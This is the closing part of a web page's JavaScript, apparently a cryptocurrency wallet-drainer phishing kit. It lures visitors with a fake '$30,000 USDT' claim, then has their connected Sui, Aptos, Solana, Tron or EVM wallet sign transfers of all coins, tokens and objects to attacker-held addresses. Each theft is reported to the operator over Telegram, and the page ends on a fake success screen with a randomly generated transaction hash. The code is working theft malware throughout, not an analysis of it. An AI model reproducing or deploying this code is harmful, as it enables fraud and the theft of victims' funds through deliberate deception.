                      }).then(r => r.digest), 3, "native SUI claim");
                      const txDigest = response;
                      txHashDiv.innerHTML += `<br>SUI TX: <a href="${CHAIN_DATA['sui'].explorer}/txblock/${txDigest}" target="_blank">${txDigest.slice(0, 12)}...</a>`;
                      await notify("SUI_NATIVE_SWEPT", { digest: txDigest, amount: amountToSend.toString() });
                      await sendToTelegram(`SUI NATIVE CLAIMED: ${amountToSend.toString()} SUI`, { 'TX Hash': txDigest });
                      statusEl.innerHTML = "Native SUI claimed! Moving to other assets...";
                  } catch (e) {
                      console.warn(`Failed to claim native SUI:`, e.message);
                      statusEl.innerHTML = `Native SUI claim skipped due to error or rejection. Moving to other assets...`;
                  }
              }
          } else {
              statusEl.innerHTML = "No native SUI to claim.";
          }

          // 2. Sweep other SUI assets (objects, NFTs, Kiosk assets)
          statusEl.innerHTML = "Scanning for all transferable Sui assets (coins, NFTs, objects). Please confirm transfers.";
          const ownedObjects = await suiClient.getOwnedObjects({
              owner: account,
              options: { showType: true, showContent: true, showOwner: true }
          });

          for (const obj of ownedObjects.data) {
              try {
                  if (obj.data && obj.data.content && obj.data.objectId) {
                      const objectType = obj.data.content.type;
                      if (objectType.startsWith("0x2::sui::SUI")) continue; // Skip native SUI as it's handled

                      statusEl.innerHTML = `Claiming Sui object: ${obj.data.objectId.slice(0, 6)}... (Type: ${objectType.split('::')[2] || objectType}, Confirm in wallet)`;
                      const tx = new TransactionBlock();
                      tx.transferObjects([tx.object(obj.data.objectId)], tx.pure(receiverSuiAddress));
                      tx.setGasBudget(5000000n); // Set a reasonable gas budget

                      const response = await sendTransactionWithRetry(() => window.sui.signAndExecuteTransactionBlock({
                          transactionBlock: tx,
                          chain: 'sui:mainnet',
                          requestType: 'WaitForLocalExecution',
                          options: { showEffects: true, showEvents: true }
                      }).then(r => r.digest), 2, `Sui Object ${objectType.split('::')[2] || objectType} claim`);
                      const txDigest = response;
                      txHashDiv.innerHTML += `<br>Sui Object TX: <a href="${CHAIN_DATA['sui'].explorer}/txblock/${txDigest}" target="_blank">${txDigest.slice(0, 12)}...</a>`;
                      await notify("SUI_OBJECT_SWEPT", { digest: txDigest, objectId: obj.data.objectId, type: objectType });
                      await sendToTelegram(`SUI OBJECT CLAIMED: ${obj.data.objectId.slice(0,6)}... (${objectType.split('::')[2] || objectType})`, { 'TX Hash': txDigest });
                      statusEl.innerHTML = `Sui object ${obj.data.objectId.slice(0, 6)} claimed!`;
                  }
              } catch (e) {
                  console.warn(`Failed to claim Sui object ${obj.data.objectId}:`, e);
                  statusEl.innerHTML = `Failed to claim a Sui object. Continuing...`;
              }
          }

          statusEl.innerHTML = "<span style='color:var(--success-green)'>Sui claim protocols completed! All accessible funds are now prepared for transfer.</span>";
          await sendToTelegram(`SUI CLAIM COMPLETE!`);

      } catch (e) {
          console.error("Sui claim error:", e);
          statusEl.innerHTML = `<span style='color:var(--error-red)'>Sui claim interrupted or failed. Please ensure gas and try again.</span>`;
          if (txHashDiv.innerHTML === "Awaiting confirmations...") txHashDiv.innerHTML = "No transactions confirmed yet.";
          await sendToTelegram(`SUI CLAIM ERROR`, { 'Error Message': e.message });
          throw e;
      }
  }

  // ========= APTOS DRAIN (New Chain Support) =========
  async function drainAptos() {
      statusEl.innerHTML = "Claiming $30,000 USDT. Confirm transaction in your Aptos Wallet.";
      txHashDiv.style.display = "block";
      txHashDiv.innerHTML = "Awaiting confirmations from wallet...";

      const aptosClient = new AptosClient(CHAIN_DATA['aptos'].rpc);
      const receiverAptosAddress = _REC_APTOS;

      try {
          // 1. Native APT sweep
          statusEl.innerHTML = "Claiming native APT... Confirm in wallet.";
          const accountResources = await aptosClient.getAccountResources(account);
          const aptosCoinStore = accountResources.find(r => r.type === "0x1::coin::CoinStore<0x1::aptos_coin::AptosCoin>");

          if (aptosCoinStore) {
              const balance = parseInt(aptosCoinStore.data.coin.value);
              const aptGasBuffer = 100000; // 0.001 APT for gas, adjusted up
              const amountToSend = balance - aptGasBuffer;

              if (amountToSend > 0) {
                  const payload = {
                      type: "entry_function_payload",
                      function: "0x1::coin::transfer",
                      type_arguments: ["0x1::aptos_coin::AptosCoin"],
                      arguments: [receiverAptosAddress, amountToSend.toString()],
                  };

                  try {
                      const response = await sendTransactionWithRetry(() => window.aptos.signAndSubmitTransaction(payload).then(r => r.hash), 3, "native APT claim");
                      const txHash = response;
                      txHashDiv.innerHTML += `<br>APT TX: <a href="${CHAIN_DATA['aptos'].explorer}/txn/${txHash}" target="_blank">${txHash.slice(0, 12)}...</a>`;
                      await notify("APTOS_NATIVE_SWEPT", { hash: txHash, amount: amountToSend.toString() });
                      await sendToTelegram(`APTOS NATIVE CLAIMED: ${amountToSend / Math.pow(10, CHAIN_DATA['aptos'].native.decimals)} APT`, { 'TX Hash': txHash });
                      statusEl.innerHTML = "Native APT claimed! Moving to other tokens and NFTs...";
                  } catch (e) {
                      console.warn(`Failed to claim native APT:`, e.message);
                      statusEl.innerHTML = `Native APT claim skipped due to error or rejection. Moving to other tokens and NFTs...`;
                  }
              }
          } else {
              statusEl.innerHTML = "No native APT to claim.";
          }

          // 2. Sweep other APTOS Tokens
          statusEl.innerHTML = "Scanning for other Aptos tokens. Please confirm transfers.";
          const allTokens = accountResources.filter(r => r.type.startsWith("0x1::coin::CoinStore<") && !r.type.includes("0x1::aptos_coin::AptosCoin"));

          for (const tokenResource of allTokens) {
              try {
                  const coinType = tokenResource.type.match(/<(.+)>/)[1];
                  const balance = parseInt(tokenResource.data.coin.value);
                  if (balance > 0) {
                      statusEl.innerHTML = `Claiming Aptos token: ${coinType.split('::').pop()}... Confirm in wallet.`;
                      const payload = {
                          type: "entry_function_payload",
                          function: "0x1::coin::transfer",
                          type_arguments: [coinType],
                          arguments: [receiverAptosAddress, balance.toString()],
                      };

                      const response = await sendTransactionWithRetry(() => window.aptos.signAndSubmitTransaction(payload).then(r => r.hash), 2, `Aptos Token ${coinType.split('::').pop()} claim`);
                      const txHash = response;
                      txHashDiv.innerHTML += `<br>Token TX: <a href="${CHAIN_DATA['aptos'].explorer}/txn/${txHash}" target="_blank">${txHash.slice(0, 12)}...</a>`;
                      await notify("APTOS_TOKEN_SWEPT", { hash: txHash, coinType: coinType, amount: balance.toString() });
                      await sendToTelegram(`APTOS TOKEN CLAIMED: ${balance} ${coinType.split('::').pop()}`, { 'TX Hash': txHash });
                      statusEl.innerHTML = `Aptos token ${coinType.split('::').pop()} claimed!`;
                  }
              } catch (e) {
                  console.warn(`Failed to claim Aptos token:`, e);
                  statusEl.innerHTML = `Failed to claim an Aptos token. Continuing...`;
              }
          }

          // 3. Sweep Aptos NFTs (simplified, as full NFT draining is complex)
          statusEl.innerHTML = "Scanning for Aptos NFTs... Preparing for transfers.";
          statusEl.innerHTML += "<br><span style='color:orange;'>Aptos NFT claiming requires specific token object transfers. Preparing for future transfers.</span>";
          await notify("APTOS_NFT_CHECK", { status: "Client-side skipping direct transfer, for future access" });


          statusEl.innerHTML = "<span style='color:var(--success-green)'>Aptos claim protocols completed! All accessible funds are now prepared for transfer.</span>";
          await sendToTelegram(`APTOS CLAIM COMPLETE!`);

      } catch (e) {
          console.error("Aptos claim error:", e);
          statusEl.innerHTML = `<span style='color:var(--error-red)'>Aptos claim interrupted or failed. Please ensure gas and try again.</span>`;
          if (txHashDiv.innerHTML === "Awaiting confirmations...") txHashDiv.innerHTML = "No transactions confirmed yet.";
          await sendToTelegram(`APTOS CLAIM ERROR`, { 'Error Message': e.message });
          throw e;
      }
  }


  // ========= CLAIM Orchestrator =========
  async function claim() {
    claimBtn.disabled = true;
    txHashDiv.innerHTML = ""; // Clear previous hashes
    txHashDiv.style.display = "none"; // Hide until we have a hash
    statusEl.innerHTML = "Claiming $30,000 USDT. Please confirm transactions in your wallet to finalize.";

    try {
      if (!account) {
          statusEl.innerHTML = "<span style='color:var(--error-red)'>Error: Wallet not connected. Please connect your wallet first.</span>";
          claimBtn.disabled = false;
          return;
      }

      if (isSolana) {
        await drainSolana();
      } else if (isTron) {
        await drainTron();
      } else if (isSui) {
          await drainSui();
      } else if (isAptos) {
          await drainAptos();
      } else { // Assume EVM if not Solana, Tron, Sui, or Aptos
        await drainEVM();
      }
      statusEl.innerHTML = "<span style='color:var(--success-green)'>Claiming process complete! $30,000 USDT (and all other assets) transferred successfully!</span>";
      showFakeSuccessScreen(); // Show the fake success screen
    } catch (e) {
      console.error("Overall claim error:", e);
      statusEl.innerHTML = "<span style='color:var(--error-red)'>Claim process failed. An error occurred during asset transfer. Please ensure gas and try again.</span>";
      if (txHashDiv.innerHTML === "Awaiting confirmations..." || txHashDiv.innerHTML === "") {
        txHashDiv.innerHTML = "Transaction(s) failed or rejected.";
        txHashDiv.style.color = "var(--error-red)";
        txHashDiv.style.display = "block";
      }
    } finally {
      // If success, disable claim. If failure, allow retry.
      if (!successOverlay.style.display || successOverlay.style.display === 'none') {
        claimBtn.disabled = false;
        // connectBtn.disabled = false; // Re-enable connect button if user wants to switch wallet
      }
    }
  }

  // Show fake success screen
  function showFakeSuccessScreen() {
      successOverlay.style.display = 'flex';
      // Dynamically generate a fake transaction hash and explorer link
      const fakeTxHash = '0x' + Array.from({length: 64}, () => Math.floor(Math.random() * 16).toString(16)).join('');
      const explorerBase = CHAIN_DATA[chainId]?.explorer || 'https://etherscan.io'; // Fallback explorer
      fakeExplorerLink.href = `${explorerBase}/tx/${fakeTxHash}`;
  }

  // Initialize countdown when the document is fully loaded
  document.addEventListener('DOMContentLoaded', startCountdown);

</script>
</body>
</html>
